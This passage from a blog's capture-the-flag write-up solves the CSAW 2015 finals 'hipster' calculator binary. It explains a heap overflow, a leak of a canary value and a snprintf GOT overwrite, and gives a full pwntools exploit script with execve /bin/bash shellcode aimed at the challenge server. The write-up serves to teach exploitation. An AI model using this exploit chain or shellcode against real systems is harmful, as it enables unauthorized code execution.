<p>So <code class="highlighter-rouge">8 bytes into our stack - 4</code> is just 4 bytes in, which is a pointer to the top of the stack. This is important as we will use this to read out the random value from a stack we create.</p>

<pre>
[vagrant@kamino csaw2015finals]$ ./hipster
Sieg Heil!
Welcome to Hipster Hitler's Pocket Calculator!
My computing resources await you, mein Führer.
We now use Reverse Polish Notation as a result of our recent conquest of Poland.
All commands are prefixed with ':'.
Type :help for a list of commands.
==&gt; :new
Switching to new stack, mein Führer.
==&gt; :top
154038288
==&gt; ^C
[vagrant@kamino csaw2015finals]$ python -c 'print hex(154038288)'
0x92e7010
</pre>

<p>Kewl, so since the allocation of each stack is a multiple of 4, we can pretty much be sure that each stack will be allocated right next to each other. Therefore, with the leak that we have of the top of the stack for the first allocation, we will have to throw in <code class="highlighter-rouge">0xac</code> bytes into stack #1 to get to the point where we are about to overflow into stack #2s top of stack pointer. We will then put a pointer to point to stack #1s random value.</p>

<pre>
[-------- top --------]
stack1+0    random value
stack1+4    pointer to top of stack
stack1+8    shellcode and nops
...
stack1+164  shellcode and nops
[-------- end --------]
[-------- top --------]
stack2+0    shellcode and nops
stack2+4    overflowed with pointer to stack1+0
stack2+8    numbers and stuff
...
stack2+164  numbers and stuff
[-------- end --------]
</pre>

<p>I also decided to just use stack #1 as the place to store the shellcode and just pad it with nops. Since we are just using a stack based calculator, you have to come up with some way to write arbiturary values by using math. <code class="highlighter-rouge">write_num</code> in the exploit script is a demonstration on how to do this.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c"># Create stack #2 in order to leak random value</span>
<span class="n">new_stack</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

<span class="c"># Getting the next stack puts us back at stack #1</span>
<span class="n">next_stack</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

<span class="c"># Throw our shellcode into stack #1</span>
<span class="n">padding</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="p">)</span>
<span class="n">write_vals</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">padding</span><span class="p">)</span>

<span class="c"># Position stack #2s top of stack to point to random value</span>
<span class="n">random_val_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0xb4</span>
<span class="n">write_num</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="n">random_val_offset</span><span class="p">)</span>

<span class="c"># Shift back to stack #2 and read random value from top of stack</span>
<span class="n">next_stack</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
<span class="n">random_value</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">top_val</span><span class="p">(</span><span class="n">r</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span>
<span class="k">print</span> <span class="s">"[+] Got random value: 0x</span><span class="si">%08</span><span class="s">x"</span> <span class="o">%</span> <span class="n">random_value</span></code></pre></figure>

<p>Now that we have the random value, we can start writing to an arbituary location by setting the top of stack to be our location of choice. Since we already have our shellcode in the program at this point, we just need a function pointer to point to our first stack. The GOT is a great place to overwrite for this :3 The rest of the exploit is pretty self explanatory.</p>

<p>Turns out the socket code was just left over from another version of the challenge, so nothing super secret about it :3</p>

<p>Here is the full exploit script (<a href="http://pwntools.readthedocs.org">pwntools is &lt;3</a>):</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c">#context.log_level = "DEBUG"</span>

<span class="c">#r = remote("localhost", 2323)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"54.164.94.180"</span><span class="p">,</span> <span class="mi">1939</span><span class="p">)</span>
<span class="n">pause</span><span class="p">()</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"hipster"</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52</span><span class="s">"</span> \
            <span class="s">"</span><span class="se">\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e</span><span class="s">"</span> \
            <span class="s">"</span><span class="se">\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80</span><span class="s">"</span>

<span class="k">def</span> <span class="nf">new_stack</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">":new"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"==&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">next_stack</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">":next"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"==&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">top_val</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">":top"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"==&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">disp_stack</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">":disp"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"==&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">del_stack</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">":del"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">send_val</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">v</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">v</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"==&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">send_vals</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">v</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="p">[</span><span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">14</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">v</span><span class="p">),</span> <span class="mi">14</span><span class="p">)]:</span>
        <span class="n">send_val</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">write_num</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">num</span><span class="p">):</span>
    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">while</span> <span class="n">num</span> <span class="o">&gt;</span> <span class="mi">9</span><span class="p">:</span>
        <span class="n">expression</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">total</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
            <span class="k">while</span> <span class="n">num</span> <span class="o">!=</span> <span class="n">total</span> <span class="ow">and</span> <span class="n">num</span> <span class="o">&gt;=</span> <span class="n">total</span><span class="o">*</span><span class="n">i</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">total</span><span class="p">:</span>
                    <span class="n">total</span> <span class="o">*=</span> <span class="n">i</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">total</span> <span class="o">=</span> <span class="n">i</span>
                <span class="n">expression</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
            <span class="k">if</span> <span class="n">num</span> <span class="o">==</span> <span class="n">total</span><span class="p">:</span>
                <span class="k">break</span>
        <span class="n">num</span> <span class="o">-=</span> <span class="n">total</span>
        <span class="n">e</span> <span class="o">=</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">expression</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="s">"*"</span> <span class="o">*</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">expression</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>
        <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
    <span class="n">o</span> <span class="o">=</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="s">"+"</span> <span class="o">*</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">+</span> <span class="s">"+"</span>
    <span class="n">send_vals</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">o</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">write_vals</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">v</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="p">[</span><span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">v</span><span class="p">),</span> <span class="mi">4</span><span class="p">)]:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
        <span class="n">write_num</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">leak_heap_addr</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="n">new_stack</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">top_val</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

<span class="c"># Create stack #1 to leak heap address</span>
<span class="n">new_stack</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"==&gt; "</span><span class="p">)</span>

<span class="n">heap_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak_heap_addr</span><span class="p">(</span><span class="n">r</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span>
<span class="k">print</span> <span class="s">"[+] Leaked heap addr: 0x</span><span class="si">%08</span><span class="s">x"</span> <span class="o">%</span> <span class="n">heap_addr</span>

<span class="c"># Create stack #2 in order to leak random value</span>
<span class="n">new_stack</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

<span class="c"># Getting the next stack puts us back at stack #1</span>
<span class="n">next_stack</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

<span class="c"># Throw our shellcode into stack #1</span>
<span class="n">padding</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="p">)</span>
<span class="n">write_vals</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">padding</span><span class="p">)</span>

<span class="c"># Position stack #2s top of stack to point to random value</span>
<span class="n">random_val_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0xb4</span>
<span class="n">write_num</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="n">random_val_offset</span><span class="p">)</span>

<span class="c"># Shift back to stack #2 and read random value from top of stack</span>
<span class="n">next_stack</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
<span class="n">random_value</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">top_val</span><span class="p">(</span><span class="n">r</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span>
<span class="k">print</span> <span class="s">"[+] Got random value: 0x</span><span class="si">%08</span><span class="s">x"</span> <span class="o">%</span> <span class="n">random_value</span>

<span class="n">overwrite_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"snprintf"</span><span class="p">]</span>

<span class="c"># Create stack #3 and #4</span>
<span class="n">new_stack</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
<span class="n">new_stack</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

<span class="c"># Shift from stack #4 back to stack #3</span>
<span class="n">next_stack</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="c"># Stack 1</span>
<span class="n">next_stack</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="c"># Stack 2</span>
<span class="n">next_stack</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="c"># Stack 3</span>

<span class="c"># Pad stack #3 until we overwrite into stack #4</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="mh">0xac</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
    <span class="n">send_val</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

<span class="c"># Write our random value and address we want to write to</span>
<span class="c"># to the top of the stack</span>
<span class="n">write_num</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">random_value</span><span class="p">)</span>
<span class="n">write_num</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">overwrite_got</span><span class="p">)</span>

<span class="c"># Shift to stack #4 (really shifting to the GOT address of snprintf)</span>
<span class="n">next_stack</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
<span class="c"># Write the address of the first heap to the snprintf GOT entry</span>
<span class="n">first_heap_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">^</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">))</span> <span class="o">|</span> <span class="mh">0x10</span>
<span class="n">write_num</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">first_heap_addr</span><span class="p">)</span>

<span class="c"># Trigger a call to snprintf</span>
<span class="n">del_stack</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

<span class="c"># Get our shell &lt;3</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>


</article>









      </div>
    </div>
  </div>

  <footer class="center">
  <div class="measure">
    <small>
      Thank you for reading dear reader, and good night...<br />
      Blog made with &lt;3 by Breadchris<br />
      Theme crafted with &lt;3 by <a href="http://johnotander.com">John Otander</a> (<a href="https://twitter.com/4lpine">@4lpine</a>).
    </small>
  </div>
</footer>

</body>
</html>
